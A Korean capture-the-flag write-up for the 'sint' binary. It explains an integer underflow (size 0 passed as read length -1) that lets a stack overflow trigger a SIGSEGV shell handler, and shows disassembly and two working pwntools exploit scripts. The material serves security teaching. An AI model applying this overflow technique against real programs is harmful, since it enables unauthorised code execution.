#정수오버플로우 #정수언더플로우 

### 1. 파일 분석

./sint: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=947126fc21f880e02d4cd134916108100c297998, not stripped

```
[*]
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

ASLR이 적용되어 있고, 바이너리에는 NX가 적용되어 있다. Canary 와 PIE는 적용도지 않았다.
또한 Partial RELRO 가 적용되어 있다.

Canary가 적용되지 않았기 때문에 버퍼 오버플로우를 일으킬 시, 카나리를 올바른 값으로 덮어주지 않아도 프로세스의 흐름을 계속 이어나갈 수 있다.

### 2. C 소스파일 분석

``` c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler()
{
    puts("TIME OUT");
    exit(-1);
}

/*
stdin, stdout 버퍼링 해제(입출력이 즉각적으로 보이게 함)
alarm(30) -> 30초 후 프로그램 강제 종료
SIGALRM 발생시 alarm_handler 실행 -> "TIME OUT" 출력 후 종료 
*/
void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

void get_shell()
{
    system("/bin/sh");
}

int main()
{
    char buf[256];
    int size;

    initialize();

    signal(SIGSEGV, get_shell);

    /*
    size 값을 공격자가 조작 가능.
    제한: 0 <= size <= 256 만 허용함.
    */
    printf("Size: ");
    scanf("%d", &size);

    if (size > 256 || size < 0)
    {
        printf("Buffer Overflow!\n");
        exit(0);
    }

    /*
    size-1 바이트 만큼 입력 받음.
    size = 0 일 경우 -> read(0, buf, -1) 호출됨.
        read는 음수 크기를 unsigned로 변환 -> 매우 큰 값으로 처리됨. 
        즉, 대규모 버퍼 오버플로우 발생 가능!
    signal(SIGSEGV, get_shell)
        만약 버퍼 오버플로우로 Segmentation fault 발생 시,
        자동으로 get_shell() 실행 -> 셸 획득!
    */
    printf("Data: ");
    read(0, buf, size - 1);

    return 0;
}
```

signal(SIGSEGV, get_shell) 가 지정되었기 때문에 SIGSEGV 에러, 즉 세그먼트 에러가 발생하게 되면 셸을 획들할 수 있다.
세그먼트 에러는 main 함수의 RET에 올바르지 않은 주소를 입력함으로써 일으킬 수 있다.

### 3. 익스플로잇

size 변수를 사용자로부터 입력받은 후, size > 256 || size < 0 이라면 프로세스를 종료한다. 따라서 size 의 범위는 0 ~ 256 이어야 한다.

올바른 사이즈가 설정되면  read(0, buf, size - 1) 으로 buf 에 문자열을 입력 받는다. buf에는 256 바이트가 할당되어 있으며, 버퍼 오버플로우가 일어나기 위해서는 257 바이트 이상을 입력받아야 하나, read 함수에 들어가는 읽을 바이트 수 인자는 size - 1로 -1 ~ 255의 값만이 가능하다.

read 함수의 인자 자료형
```
ssize_t read(int fildes, void *buf, size_t nbyte)
```

읽어들일 바이트 수를 지정하는 nbyte 인자는 size_t 자료형인 것을 확인할 수 있다. size_t 자료형은 32비트 아키텍쳐에서 기본적으로 unsigned int 와 동일한 연산을 진행한다.
따라서 nbyte 의 인자로 -1이 들어간다면 자동으로 형변환되어 0xffffffff = 4294967295 와 같은 의미를 가지게 된다. 따라서 size = 0 으로 설정한 후, size - 1 = -1 이 되게 하여 read(0, buf, 4294967295) 와 같은 기능을 실행시키게 하여 오버 플로우를 일으킬 수 있다.

버퍼 오버플로우를 일으킨 후에는 RET에 올바르지 않은 주소라 들어가기만 하면 되기에 buf 의 길이 이상의 적당히 긴 문자열을 전송하여 세그먼트 에러를 발생할 수 있다. 
혹은 PIE 가 적용되지 않았기 때문에 get_shell 의 주소를 RET에 삽입하는 방법으로 해결 또한 가능하다.

buf 의 위치 찾기
```
disass main
Dump of assembler code for function main:
   0x0804866c <+0>:     push   ebp
   0x0804866d <+1>:     mov    ebp,esp
   0x0804866f <+3>:     sub    esp,0x104
   0x08048675 <+9>:     call   0x8048612 <initialize>
   0x0804867a <+14>:    push   0x8048659
   0x0804867f <+19>:    push   0xb
   0x08048681 <+21>:    call   0x8048470 <signal@plt>
   0x08048686 <+26>:    add    esp,0x8
   0x08048689 <+29>:    push   0x80487a1
   0x0804868e <+34>:    call   0x8048460 <printf@plt>
   0x08048693 <+39>:    add    esp,0x4
   0x08048696 <+42>:    lea    eax,[ebp-0x104]
   0x0804869c <+48>:    push   eax
   0x0804869d <+49>:    push   0x80487a8
   0x080486a2 <+54>:    call   0x80484e0 <__isoc99_scanf@plt>
   0x080486a7 <+59>:    add    esp,0x8
   0x080486aa <+62>:    mov    eax,DWORD PTR [ebp-0x104]
   0x080486b0 <+68>:    cmp    eax,0x100
   0x080486b5 <+73>:    jg     0x80486c1 <main+85>
   0x080486b7 <+75>:    mov    eax,DWORD PTR [ebp-0x104]
   0x080486bd <+81>:    test   eax,eax
   0x080486bf <+83>:    jns    0x80486d5 <main+105>
   0x080486c1 <+85>:    push   0x80487ab
   0x080486c6 <+90>:    call   0x8048490 <puts@plt>
   0x080486cb <+95>:    add    esp,0x4
   0x080486ce <+98>:    push   0x0
   0x080486d0 <+100>:   call   0x80484b0 <exit@plt>
   0x080486d5 <+105>:   push   0x80487bc
   0x080486da <+110>:   call   0x8048460 <printf@plt>
   0x080486df <+115>:   add    esp,0x4
   0x080486e2 <+118>:   mov    eax,DWORD PTR [ebp-0x104]
   0x080486e8 <+124>:   sub    eax,0x1
   0x080486eb <+127>:   push   eax
   0x080486ec <+128>:   lea    eax,[ebp-0x100]
   0x080486f2 <+134>:   push   eax
   0x080486f3 <+135>:   push   0x0
   0x080486f5 <+137>:   call   0x8048450 <read@plt>
   0x080486fa <+142>:   add    esp,0xc
   0x080486fd <+145>:   mov    eax,0x0
   0x08048702 <+150>:   leave
   0x08048703 <+151>:   ret
End of assembler dump.
```

[ebp-0x100] 의 위치에 buf가 있는것을 확인할 수 있다.

``` python
from pwn import *

p = process("./sint")

p.sendline(b"0")
p.sendline(b"A" * (0x104 + 0x4 + 0x4))

p.interactive()
```

``` python
from pwn import *

p = process("./sint")
e = ELF("./sint")
get_shell = e.symbols["get_shell"]

p.sendline(b"0")
p.sendline(b"A" * (0x104 + 0x4) + p32(get_shell))

p.interactive()
```